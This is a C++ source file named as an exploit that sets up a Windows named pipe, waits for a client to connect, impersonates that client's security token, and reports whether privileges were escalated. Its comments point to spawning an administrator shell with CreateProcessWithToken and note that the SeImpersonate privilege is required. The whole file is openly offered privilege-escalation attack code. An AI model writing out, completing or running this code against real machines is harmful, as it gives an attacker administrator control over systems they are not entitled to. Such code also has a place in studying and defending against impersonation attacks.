// Named_pipe_exploit.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <namedpipeapi.h>

BOOL IsElevated() {
	BOOL IsElevated = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			IsElevated = Elevation.TokenIsElevated;
		}
	}
	if (hToken) {
		CloseHandle(hToken);
	}
	return IsElevated;
}

#define ERROR(x) {printf("[-] Exiting, Reason: %s, CODE: %d",x, GetLastError()); return 1;}

int main()
{
	HANDLE hNamedPipe = ::CreateNamedPipe(L"\\\\.\\pipe\\supersecurechannel",
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT | PIPE_ACCEPT_REMOTE_CLIENTS,
		PIPE_UNLIMITED_INSTANCES,
		1000, 1000, 0, nullptr);

	if (hNamedPipe == INVALID_HANDLE_VALUE)
		ERROR("Failed to create named pipe");

	printf("Waiting for the client\n");
	if (!::ConnectNamedPipe(hNamedPipe, nullptr) && ::GetLastError() != ERROR_PIPE_CONNECTED)
		ERROR("Failed in ConnectNamedPipe");

	WCHAR readDATA[500];
	DWORD ByteRead;
	if (!ReadFile(hNamedPipe, &readDATA, sizeof(readDATA)-1, &ByteRead, NULL)) {
		if (::GetLastError() == ERROR_BROKEN_PIPE) {
			printf("Client disconnected\n");
		}
		ERROR("Failed to read from the pipe");
	}
	else {
		printf("PIPE DATA %ls\n", readDATA);
	}

	if(!::ImpersonateNamedPipeClient(hNamedPipe))
		ERROR("IMPERSONATION FAILED");

	// Write the code you need to execuete as admin here
	// createprocesswithtoken will suffice in spawning a admin shell
	//
	// seImpersonate is needed
	if (IsElevated()) {
		printf("SUCESSFULY ESCALATED PRIVELEGES\n");
	}
	else
	{
		printf("Failed to escalate, Check if seImpersonate is given\n");
	}

	::RevertToSelf();
	return 0;
}

